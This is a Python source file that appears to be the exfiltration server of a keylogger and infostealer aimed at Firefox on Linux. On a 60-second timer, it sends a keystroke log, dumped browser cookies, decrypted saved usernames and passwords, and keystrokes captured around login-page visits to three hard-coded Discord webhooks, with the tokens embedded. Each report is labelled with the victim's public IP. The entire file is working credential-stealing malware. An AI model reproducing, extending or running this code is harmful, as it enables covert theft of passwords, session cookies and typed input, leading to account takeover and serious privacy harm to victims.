from dhooks import Webhook
import dhooks
from threading import Timer
import datetime
import os


from browser_history import Browser_history
import util
import cookies
import firefox_decrypt_saved_logins

KL_WEBHOOK = "https://discord.com/api/webhooks/1167780238562967553/7-nSGY7aLm71F00y63tLM-Yh5XsJ3qQVx9uBKiF0DO7xI07Hia7f0F9jmBJ-gzsPGRuG"
LOGIN_WEBHOOK = "https://discord.com/api/webhooks/1167817842486411317/tom9LJ_mzGhsVTLOFYvSbiJBfn1X37_CrXk5GpzRm7q4koB0YzZM40F0GsmT89Rtf0Pg"
COOKIES_WEBHOOK = "https://discord.com/api/webhooks/1169001947521634494/RPNwevyrjYj7Iq5OncBB0bI4CCQeO05fVID9VbEEjSZmgo7or9qChsIUUXh5LmN8vgs1"
KEY_LOG_FILENAME = "../../log/keylogger.log"
HISTORY_JSON_FILENAME = "../../log/history.json"
BASE_PATH = f"/home/{os.getlogin()}/.mozilla/firefox/{util.find_firefox_profile()}/"
REPORT_PERIOD = 60
LOGIN_WAIT_INPUT = 15

class Server:
    def __init__(self, kl_webhook : str, login_webhook : str, cookies_webhook : str, period : int, 
                 key_log_filename : str, base_path : str, history_filename : str) -> None:
        self.kl_web_hook : Webhook = Webhook(kl_webhook)
        self.login_web_wook : Webhook = Webhook(login_webhook)
        self.cookies_web_wook : Webhook = Webhook(cookies_webhook)
        self.Browser_history : Browser_history = Browser_history(base_path + "/places.sqlite", history_filename)
        self.base_path : str = base_path
        self.interval : int = period
        self.key_log_file : str = key_log_filename
        self.user_ip : str = util.get_public_ip()
        self.last_datetime : datetime = datetime.datetime.now()

    def _send_kl_report(self) -> None:
        self.kl_web_hook.send(f"Report for {self.user_ip}:", file=dhooks.File(self.key_log_file))
    
    def _send_cookies(self) -> None:
        try:
            cookie_list = cookies.dump(self.base_path + "/cookies.sqlite")
            with open("../../log/cookies.txt", "w") as file:
                for v in cookie_list:
                    file.write(str(v) + '\n')
            self.cookies_web_wook.send(f"Cookies for {self.user_ip}:", file=dhooks.File("../../log/cookies.txt"))
            print("Cookies were successfully exported!")
        except Exception as e : # when firefox is running the cookie db is locked
            print(f"Unable to get cookies: {e}")

    def _check_for_logins(self) -> None:
        self.Browser_history.import_database()
        delta = datetime.timedelta(seconds=LOGIN_WAIT_INPUT)
        urls : list[str] = self.Browser_history.get_records_urls(self.last_datetime, datetime.datetime.now(),
                                                            ["login", "signin"])
        for url in urls:
            keys = util.get_keys_in_datetime_range(self.key_log_file, url[1], url[1] + delta)
            notification_str : str = f"Possible login for {self.user_ip}: url - {url[0]} keys - {keys}"
            print(notification_str)
            self.login_web_wook.send(notification_str)
            self.last_datetime = url[1]
    
    def _check_for_saved_logins(self) -> None:
        try:
            out_text = firefox_decrypt_saved_logins.main()
            with open("../../log/logins.txt", "w") as file:
                for out_item in out_text:
                    for output in out_item.pwstore:
                        record: str = (
                            f"\nWebsite:   {output['url']}\n"
                            f"Username: '{output['user']}'\n"
                            f"Password: '{output['password']}'\n"
                        )
                        file.write(record)
            self.login_web_wook.send(f"Saved logins for {self.user_ip}:", file=dhooks.File("../../log/logins.txt"))
            print("Saved logins were successfully exported!")
        except Exception as e:
            print(f"Unable to access or decrypt firefox's saved logins: {e}")

    def _process(self) -> None:
        self._send_kl_report()
        self._check_for_saved_logins()
        self._check_for_logins()
        self._send_cookies()
        self.period = Timer(self.interval, self._process).start()

    def run(self) -> None:
        self._process()

if __name__ == "__main__":
    server : Server = Server(KL_WEBHOOK, LOGIN_WEBHOOK, COOKIES_WEBHOOK, REPORT_PERIOD, KEY_LOG_FILENAME, 
                             BASE_PATH, HISTORY_JSON_FILENAME)
    server.run()